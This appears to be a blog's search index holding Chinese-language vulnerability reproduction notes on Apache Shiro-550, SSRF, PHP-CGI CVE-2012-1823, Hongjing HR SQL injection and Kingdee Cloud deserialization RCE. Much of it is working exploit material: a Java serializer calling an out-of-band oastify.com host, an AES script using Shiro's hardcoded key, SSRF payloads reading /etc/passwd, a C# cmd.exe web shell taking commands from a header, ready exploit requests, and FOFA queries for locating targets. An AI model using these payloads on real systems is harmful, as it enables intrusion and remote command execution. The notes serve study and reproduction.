<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>shiro550分析复现</title>
    <url>/2023/06/12/shiro%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git</span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>



<p>找到shiro&#x2F;samples&#x2F;web里面的pom.xml，把jstl的版本改成1.2</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配一下tomcat，启动</p>
<h3 id="看登录逻辑"><a href="#看登录逻辑" class="headerlink" title="看登录逻辑"></a>看登录逻辑</h3><p>看一下登录包</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612164707912.png" alt="image-20230612164707912"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612164815088.png" alt="image-20230612164815088"></p>
<p>shiro登录逻辑是，点击remmerberme之后</p>
<p>第一个请求的返回会给一串set-cookie，进行重定向</p>
<p>然后你用这个cookie值在请求重定向后的网页</p>
<h4 id="找源码"><a href="#找源码" class="headerlink" title="找源码"></a>找源码</h4><p>去看源码，找一下cookie</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612171725697.png" alt="image-20230612171725697"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612171735017.png" alt="image-20230612171735017"></p>
<p>往下看，能看到base64编码</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172015492.png" alt="image-20230612172015492"></p>
<p>看看哪里调用了这个方法</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172106578.png" alt="image-20230612172106578"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172125292.png" alt="image-20230612172125292"></p>
<p>找到这个decrypt()，进去，找到getCipherService()</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172603128.png" alt="image-20230612172603128"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172616571.png" alt="image-20230612172616571"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172626606.png" alt="image-20230612172626606"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172644597.png" alt="image-20230612172644597"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612172718535.png" alt="image-20230612172718535"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/image-20230612172725265.png" alt="image-20230612172725265">发现key是常量</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230612214512006.png" alt="image-20230612214512006"></p>
<p>iv是随便取的</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>bp起一个监听collaborator (dnslog)，java生成poyload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://y65fxv6rch5rzwh0fcrxf3awangd42.oastify.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">hashCodeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    hashCodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    hashCodeField.set(url,<span class="number">1234</span>);</span><br><span class="line">    hashmap.put(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    hashCodeField.set(url,-<span class="number">1</span>);</span><br><span class="line">    serialize(hashmap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>python实现aes加密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 加密脚本</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_dec</span>(<span class="params">enc_data</span>):</span><br><span class="line">    enc_data = base64.b64decode(enc_data)</span><br><span class="line">    unpad = <span class="keyword">lambda</span> s: s[:-s[-<span class="number">1</span>]]</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = enc_data[:<span class="number">16</span>]</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    plaintext = encryptor.decrypt(enc_data[<span class="number">16</span>:])</span><br><span class="line">    <span class="comment"># plaintext = bytes.decode(plaintext)</span></span><br><span class="line">    plaintext = unpad(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># enc_data = b&quot;AALv9ZLoHe8dKEtIeH7y/2i9M9S70eanvsGbaN+DYSInYaw1cjtZvWNhXegmgP2DLI+VHLIxBrahwOUK4XNB2Vr</span></span><br><span class="line">    <span class="comment"># plaintext = aes_dec(enc_data)</span></span><br><span class="line">    <span class="comment"># print(plaintext)</span></span><br><span class="line">    data = get_file_data(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br></pre></td></tr></table></figure>

<p>直接复制到流量包是不会走到反序列化的流程里的，要把sessionid删掉，不删是这样</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230614143021221.png" alt="image-20230614143021221"></p>
<p>删了之后就是这个</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230614142555692.png" alt="image-20230614142555692"></p>
<p>回看bp的监听</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230614143829553.png" alt="image-20230614143829553"></p>
<p>已经弹回来了</p>
<h3 id="自查检测工具"><a href="#自查检测工具" class="headerlink" title="自查检测工具"></a>自查检测工具</h3><p><a href="https://shiro.sumsec.me/">https://shiro.sumsec.me/</a></p>
<p>参考链接：<a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.880.my_history.page.click&vd_source=46ee6094905cc129c486ece81308d827">https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.880.my_history.page.click&amp;vd_source=46ee6094905cc129c486ece81308d827</a></p>
<h3 id="cc链（正在写）"><a href="#cc链（正在写）" class="headerlink" title="cc链（正在写）"></a>cc链（正在写）</h3><blockquote>
<p>cc:<a href="https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads">https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads</a></p>
</blockquote>
<p>pom添加</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>











]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf笔记</title>
    <url>/2023/06/12/ssrf%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><h4 id="漏洞出现点"><a href="#漏洞出现点" class="headerlink" title="漏洞出现点"></a>漏洞出现点</h4><h5 id="分享"><a href="#分享" class="headerlink" title="分享"></a>分享</h5><p>通过url 地址分享文章，例如如下地址:</p>
<p><a href="http://share.xxx.com/index.?url=http://127.0.0.1">http://share.xxx.com/index.?url=http://127.0.0.1</a></p>
<p>通过ur参数的获取来实现点击链接的时候跳到指定的分享文章。如果在此功能中没有对目标地址的范围做过滤与</p>
<p>限制则就存在着SSRF漏洞。</p>
<h5 id="图片加载与下载"><a href="#图片加载与下载" class="headerlink" title="图片加载与下载"></a>图片加载与下载</h5><p>通过URL地址加载或下载图片</p>
<p><a href="http://image.xxx.com/image.php?image=http://127.0.0.1">http://image.xxx.com/image.php?image=http://127.0.0.1</a></p>
<p>图片加载存在于很多的编辑器中，编辑器上传图片处，有的是加载远程图片到服务器内。还有一些采用了加载远程图片的形式，本地文章加载了设定好的远程图片服务器上的图片地址，如果没对加载的参数做限制可能造成SSRF</p>
<h5 id="图片、文章收藏功能"><a href="#图片、文章收藏功能" class="headerlink" title="图片、文章收藏功能"></a>图片、文章收藏功能</h5><p><a href="http://title.xxx.com/title?title=file://etc/passwd">http://title.xxx.com/title?title=file://etc/passwd</a></p>
<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF.</p>
<p><strong>代理服务，文件包含，多媒体加载，在线编程，站长工具，RSS,xml,</strong></p>
<h4 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h4><p>SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器发送的，从而来判断是否存在SSRF漏洞。，</p>
<p>如果网站访问的百度页面，抓包的内容组并没有请求百度，那就说明请求是由服务器发出的，存在ssrf漏洞</p>
<h5 id="SSRF常用协议"><a href="#SSRF常用协议" class="headerlink" title="SSRF常用协议"></a>SSRF常用协议</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///  看文件，端口扫描，命令执行</span><br><span class="line"></span><br><span class="line">dict://   端口扫描，命令执行</span><br><span class="line"></span><br><span class="line">sftp://  传输</span><br><span class="line"></span><br><span class="line">ftp://</span><br><span class="line"></span><br><span class="line">tftp://  </span><br><span class="line"></span><br><span class="line">ldap://  轻量级目录访问</span><br><span class="line"></span><br><span class="line">gopher://   万金油</span><br></pre></td></tr></table></figure>

<h5 id="常见触发参数名"><a href="#常见触发参数名" class="headerlink" title="常见触发参数名"></a>常见触发参数名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">share	wap	url	link	src	source</span><br><span class="line"></span><br><span class="line">target	u	3g	display	sourceURI</span><br><span class="line"></span><br><span class="line">imageURL	domain</span><br></pre></td></tr></table></figure>

<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><p><strong>@绕过</strong> </p>
<p><a href="http://www.cbaidu/">http://www.baidu</a><a href="mailto:&#x2e;&#99;&#111;&#x6d;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;">&#x2e;&#99;&#111;&#x6d;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#49;</a>:8080</p>
<p><strong>ip地址转换成进制</strong>绕过</p>
<p>ping 2130706433</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35329361/1685932689118-1545318e-a582-4769-b926-3bb6b69527ad.png" alt="img"></p>
<p>127.0.0.1先转换成2进制，去掉小数点在转回十进制</p>
<p><strong>302 redirect</strong>绕过</p>
<p>当url存在临时(302)永久(301)跳转时，则继续请求跳转后的url，那么我们可以通过http的连接302跳转到gopher协议上</p>
<p>ssrf限制只能用http或者https协议时，可以通过header函数绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Location:file:///etc/passwd&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Location:dict://127.0.0.1:6666/info&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&quot;Location:gopher://127.0.0.1:6666/info&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>xip.io</strong>绕过</p>
<p>dns解析这个host时会自动去掉后缀</p>
<p><a href="http://10.0.0.1.xip.io/">http://10.0.0.1.xip.io</a> &#x3D; 10.0.0.1</p>
<p><a href="http://www.10.0.0.1.xip.io/">www.10.0.0.1.xip.io</a>   &#x3D; 10.0.0.1</p>
<p><a href="http://mysite.10.0.0.1.xip.io=10.0.0.1">http://mysite.10.0.0.1.xip.io=10.0.0.1</a></p>
<p>foo.<a href="http://bar.10.0.0.1.xip.io/">http://bar.10.0.0.1.xip.io</a> &#x3D;10.0.0.1</p>
<p>10.0.0.1.xip.name resolves to 10.0.0.1</p>
<p><a href="http://www.10.0.0.2.xip.name/">www.10.0.0.2.xip.name</a> resolves to 10.0.0.2</p>
<p>foo.10.0.0.3.xip.name resolves to 10.0.0.3</p>
<p>bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</p>
<p><strong>封闭式字母数字</strong>绕过</p>
<p> ⓗ  ⓣ   ⓣ  Ⓟ  Ⓔ      &#x3D; <a href="http://example.com/">http://example.com</a></p>
<p>封闭式字母数字网址 <a href="https://haomeili.net/ZhiShi/34">https://haomeili.net/ZhiShi/34</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">diverse = <span class="string">&#x27;&#x27;&#x27;①②③④⑤⑥⑦⑧⑨⑴⑵⑶⑷⑸⑹⑺⑻⑼⒈⒉⒊⒋⒌⒍⒎⒏⒐⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓵⓶⓷⓸⓹⓺⓻⓼⓽&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">general = <span class="string">&#x27;&#x27;&#x27;123456789123456789123456789abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 创建转换表</span></span><br><span class="line">decode = <span class="built_in">str</span>.maketrans(diverse, general)</span><br><span class="line">encode = <span class="built_in">str</span>.maketrans(general, diverse)</span><br><span class="line"><span class="comment"># 定义一个字符串</span></span><br><span class="line">text = <span class="string">&quot;www.baidu.com&quot;</span></span><br><span class="line"><span class="comment"># 使用转换表进行加密</span></span><br><span class="line">new_text = text.translate(encode)</span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(new_text)</span><br></pre></td></tr></table></figure>

<p> <strong>DNS rebinding</strong>  </p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞复现</title>
    <url>/2023/06/13/%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><h4 id="php-cgi的远程代码执行漏洞-CVE-2012-1823"><a href="#php-cgi的远程代码执行漏洞-CVE-2012-1823" class="headerlink" title="php-cgi的远程代码执行漏洞(CVE-2012-1823)"></a>php-cgi的远程代码执行漏洞(CVE-2012-1823)</h4><p>影响版本</p>
<p>5.3.12&lt;php&lt;5.4.2</p>
<p>流量包</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1687000658571.png" alt="1687000658571"></p>
<p>url部分为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</span><br><span class="line"><span class="comment">#解码</span></span><br><span class="line"><span class="comment"># +号是空格 %3d是=  %3a是：</span></span><br><span class="line">/?-d allow_url_include=on -d auto_prepend_file=php://input</span><br></pre></td></tr></table></figure>

<p>通过该漏洞来修改WEB服务器的相关配置（本次攻击是为了开启allow_url_include、auto_prepend_file配置），从而使得一些远程执行代码的功能得以实现。</p>
<p>简单来说，这个特殊请求的功能就是使后面的POST数据能以PHP文件格式执行</p>
<h3 id="OA系统"><a href="#OA系统" class="headerlink" title="OA系统"></a>OA系统</h3><h4 id="宏景HR系统-CNVD-2023-08743"><a href="#宏景HR系统-CNVD-2023-08743" class="headerlink" title="宏景HR系统 CNVD-2023-08743"></a>宏景HR系统 CNVD-2023-08743</h4><h5 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body = &#x27;&lt;div class=&quot;hj-hy-all-one-logo&quot;&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/servlet/codesettree?categories=（Hrms编码之后的sql语句）&amp;codesetid=1&amp;flag=c&amp;parentid=-1&amp;status=1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>hrms加解密工具 <a href="https://github.com/vaycore/HrmsTool">https://github.com/vaycore/HrmsTool</a></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613105103117.png" alt="image-20230613105103117"></p>
<p>java -jar hrmsTool.jar -e  “1’ union all select ‘hongjing’,@@version–”</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GET /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&amp;codesetid=1&amp;flag=c&amp;parentid=-1&amp;status=1 HTTP/1.1</span><br><span class="line">Host: xxxxxx</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>

<h4 id="金蝶云星空RCE漏洞"><a href="#金蝶云星空RCE漏洞" class="headerlink" title="金蝶云星空RCE漏洞"></a>金蝶云星空RCE漏洞</h4><blockquote>
<p><a href="https://blog.csdn.net/qq_41904294/article/details/131332436?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_41904294/article/details/131332436?spm=1001.2014.3001.5502</a></p>
</blockquote>
<h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>由于金蝶云星空数据通信默认采用的是二进制数据格式，需要进行序列化与反序列化，在此过程中未对数据进行签名或校验，导致客户端发出的数据可被攻击者恶意篡改，写入包含恶意代码的序列化数据，达到在服务端远程命令执行的效果。该漏洞不仅存在于金蝶云星空管理中心（默认8000端口），普通应用（默认80端口）也存在类似问题。</p>
<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>6.x版本：低于6.2.1012.4</p>
<p>7.x版本：7.0.352.16 至 7.7.0.202111</p>
<p>8.x版本：8.0.0.202205 至 8.1.0.20221110</p>
<h5 id="fofa语法-1"><a href="#fofa语法-1" class="headerlink" title="fofa语法"></a>fofa语法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;金蝶云星空-管理中心&quot;</span><br></pre></td></tr></table></figure>

<h5 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h5><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">POST</span> <span class="string">/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">your-ip</span></span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">text/json</span></span><br><span class="line"> </span><br><span class="line">&#123;<span class="string">&quot;ap0&quot;</span><span class="string">:&quot;asdas&quot;</span>,<span class="string">&quot;format&quot;</span><span class="string">:&quot;3&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230624233109994.png" alt="image-20230624233109994"></p>
<p>使用 ysoserial.net工具构造Payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c &quot;a.cs;System.Windows.Forms.dll;System.Web.dll;System.dll&quot;</span><br></pre></td></tr></table></figure>

<p>命令中 -f 指定的是.net程序中的序列化类，-g  是ysoserial.net工具中的攻击链， 这里指定的是ActivitySurrogateSelectorFromFile链，这个攻击链可加载自定义的程序集。-c 是构造的程序集（a.cs），后面的dll文件是.NET  Framework中的一个核心DLL文件，包含了一些相关的类和方法(自行加载，不需要构造)</p>
<p>编写一个从请求头中获取参数执行命令的ASP.NET 程序</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">E</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">E</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.Web.<span class="type">HttpContext</span> <span class="variable">context</span> <span class="operator">=</span> System.Web.HttpContext.Current;</span><br><span class="line">        context.Server.ClearError();</span><br><span class="line">        context.Response.Clear();</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.<span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">System</span>.Diagnostics.Process();</span><br><span class="line">            process.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            <span class="type">string</span> <span class="variable">cmd</span> <span class="operator">=</span> context.Request.Headers[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">            process.StartInfo.Arguments = <span class="string">&quot;/c &quot;</span> + cmd;</span><br><span class="line">            process.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">            process.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">            process.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">            process.Start();</span><br><span class="line">            <span class="type">string</span> <span class="variable">output</span> <span class="operator">=</span> process.StandardOutput.ReadToEnd();</span><br><span class="line">            context.Response.Write(output);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (System.Exception) &#123;&#125;</span><br><span class="line">        context.Response.Flush();</span><br><span class="line">        context.Response.End();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PS：通过接收 HTTP请求中的 cmd 参数，将其作为命令行参数传递给 cmd.exe 进程，并获取其输出结果，最终将输出结果作为 HTTP 响应返回给客户端（需放到ysoserial.net工具目录下或指定绝对路径）</p>
<p>生成序列化数据，加载到PoC中</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230624233741312.png" alt="image-20230624233741312"></p>
<p>最终exp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Type: text/json</span><br><span class="line">cmd: dir</span><br><span class="line"> </span><br><span class="line">&#123;&quot;ap0&quot;:&quot;&quot;,&quot;format&quot;:&quot;3&quot;&#125;</span><br></pre></td></tr></table></figure>





<h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><p>8.x版本可通过手动添加安全配置并重启IIS的方式进行缓解，注意管理中心与普通应用配置文件均需添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 普通应用配置：&#123;WebROOT&#125;\Kingdee\K3Cloud\WebSite\App_Data\Common.config</span><br><span class="line"># 管理中心配置：&#123;WebROOT&#125;\Kingdee\K3Cloud\Services\ManagementService\App_Data\Common.config</span><br><span class="line"> </span><br><span class="line">EnabledKDSVCBinary = false</span><br></pre></td></tr></table></figure>

<p>由于该漏洞不仅影响管理中心（默认8000端口），也影响普通应用（默认80端口）。如果其它版本通过限制访问来源临时缓解漏洞，需要考虑是否会中断普通用户Web业务。</p>
<h6 id="升级修复方案"><a href="#升级修复方案" class="headerlink" title="升级修复方案"></a>升级修复方案</h6><p>7.x版本必须先安装全量补丁（修复代码）后安装临时补丁（添加安全配置）</p>
<p>8.x版本管理中心（默认8000端口）默认不对外开放，且包含修复代码。但是直接安装临时补丁可能会失败，所以依旧建议先安装全量补丁（修复代码）后安装临时补丁（添加安全配置）</p>
<h3 id="海康威视"><a href="#海康威视" class="headerlink" title="海康威视"></a>海康威视</h3><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686651655167.png" alt="1686651655167"></p>
<h4 id="cve-2017-7921-x2F-7923"><a href="#cve-2017-7921-x2F-7923" class="headerlink" title="cve-2017-7921&#x2F;7923"></a>cve-2017-7921&#x2F;7923</h4><p><strong>影响范围</strong></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686651720225.png" alt="1686651720225"></p>
<p><strong>排查步骤</strong></p>
